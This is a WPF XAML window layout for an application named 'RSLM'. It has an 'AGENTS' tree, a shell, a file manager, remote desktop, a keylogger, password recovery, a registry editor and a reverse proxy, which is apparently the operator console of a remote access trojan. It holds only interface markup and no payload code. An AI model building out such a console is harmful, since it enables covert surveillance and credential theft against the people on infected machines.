<Window x:Class="rslm_frontend.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:ad="clr-namespace:AvalonDock;assembly=AvalonDock"
        xmlns:adLayout="clr-namespace:AvalonDock.Layout;assembly=AvalonDock"
        xmlns:vs2013="clr-namespace:AvalonDock.Themes;assembly=AvalonDock.Themes.VS2013"
        Title="RSLM" Height="700" Width="1100"
        WindowStartupLocation="CenterScreen"
        WindowStyle="None"
        AllowsTransparency="True"
        Background="Transparent"
        ResizeMode="CanResize"
        FontFamily="Segoe UI"
        FontSize="11">

    <Border x:Name="WindowBorder" BorderThickness="1" CornerRadius="0" Background="#1E1E1E">
        <Border.Style>
            <Style TargetType="Border">
                <Setter Property="BorderBrush" Value="#333333"/>
                <Style.Triggers>
                    <DataTrigger Binding="{Binding IsActive, RelativeSource={RelativeSource FindAncestor, AncestorType=Window}}" Value="True">
                        <Setter Property="BorderBrush" Value="#7B2D8E"/>
                    </DataTrigger>
                </Style.Triggers>
            </Style>
        </Border.Style>

        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition Height="30"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>

            <!-- TITLE BAR -->
            <Grid Grid.Row="0" Background="#2D2D30" MouseLeftButtonDown="TitleBar_MouseLeftButtonDown">
                <TextBlock Text="  RSLM" Foreground="#7B2D8E" VerticalAlignment="Center"
                          FontSize="13" FontWeight="SemiBold" Margin="8,0,0,0"/>
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
                    <Button Content="─" Foreground="#AAAAAA" Background="Transparent" BorderThickness="0"
                           Width="46" Height="30" Click="MinimizeButton_Click"/>
                    <Button Content="□" Foreground="#AAAAAA" Background="Transparent" BorderThickness="0"
                           Width="46" Height="30" Click="MaximizeButton_Click"/>
                    <Button Content="✕" Foreground="#AAAAAA" Background="Transparent" BorderThickness="0"
                           Width="46" Height="30" Click="CloseButton_Click"/>
                </StackPanel>
            </Grid>

            <!-- TOOLBAR -->
            <ToolBar Grid.Row="1" Background="#2D2D30" Padding="8,4">
                <Button x:Name="ConnectBtn" Content="▶ Connect"
                       Background="#7B2D8E" Foreground="White"
                       Width="110" Height="28" Margin="4" Click="Connect_Click"
                       Style="{StaticResource StandardButtonStyle}"/>
                <Button x:Name="DisconnectBtn" Content="■ Disconnect"
                       Background="Transparent" Foreground="#D4D4D4"
                       Width="110" Height="28" Margin="4" Click="Disconnect_Click"
                       Style="{StaticResource StandardButtonStyle}"/>
                <Separator Style="{StaticResource VsToolBarSeparatorStyle}"/>
                <Button Content="⚡ Shell" Click="OpenShell_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="📁 Files" Click="OpenFileManager_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="🖥 Desktop" Click="OpenRemoteDesktop_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Separator Style="{StaticResource VsToolBarSeparatorStyle}"/>
                <Button Content="⌨ Keylogger" Click="OpenKeylogger_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="🔑 Passwords" Click="OpenPasswordRecovery_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="📋 Registry" Click="OpenRegistryEditor_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Separator Style="{StaticResource VsToolBarSeparatorStyle}"/>
                <Button Content="📊 Tasks" Click="OpenTaskManager_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="🔄 Proxy" Click="OpenReverseProxy_Click" Style="{StaticResource StandardButtonStyle}"/>
                <Button Content="ℹ Info" Click="OpenSystemInfo_Click" Style="{StaticResource StandardButtonStyle}"/>
            </ToolBar>

            <!-- AVALONDOCK -->
            <ad:DockingManager x:Name="DockManager" Grid.Row="2" Background="#1E1E1E">
                <ad:DockingManager.Theme>
                    <vs2013:Vs2013DarkTheme/>
                </ad:DockingManager.Theme>
                <adLayout:LayoutRoot>
                    <adLayout:LayoutPanel Orientation="Horizontal">

                        <!-- EXPLORER (LEFT) -->
                        <adLayout:LayoutAnchorablePane DockWidth="240">
                            <adLayout:LayoutAnchorable Title="AGENTS" CanClose="False" CanHide="False">
                                <TreeView x:Name="ExplorerTree" Background="#252526" Foreground="#D4D4D4"
                                          BorderThickness="0" Margin="4"
                                          MouseDoubleClick="ExplorerTree_MouseDoubleClick"/>
                            </adLayout:LayoutAnchorable>
                        </adLayout:LayoutAnchorablePane>

                        <!-- DOCUMENTS (CENTER) -->
                        <adLayout:LayoutDocumentPane x:Name="DocumentPane"/>

                    </adLayout:LayoutPanel>

                    <!-- OUTPUT (BOTTOM) -->
                    <adLayout:LayoutRoot.BottomSide>
                        <adLayout:LayoutAnchorSide>
                            <adLayout:LayoutAnchorGroup>
                                <adLayout:LayoutAnchorable Title="Output" CanClose="False" CanHide="False">
                                    <RichTextBox x:Name="OutputBox" Background="#0C0C0D" Foreground="#4EC96C"
                                                 FontFamily="Consolas" FontSize="12" BorderThickness="0"
                                                 IsReadOnly="True" VerticalScrollBarVisibility="Auto" Padding="8"/>
                                </adLayout:LayoutAnchorable>
                            </adLayout:LayoutAnchorGroup>
                        </adLayout:LayoutAnchorSide>
                    </adLayout:LayoutRoot.BottomSide>

                </adLayout:LayoutRoot>
            </ad:DockingManager>

            <!-- STATUSBAR -->
            <StatusBar x:Name="StatusBar1" Grid.Row="3" Background="#7B2D8E">
                <StatusBarItem Foreground="White">● Prêt</StatusBarItem>
            </StatusBar>
        </Grid>
    </Border>
</Window>
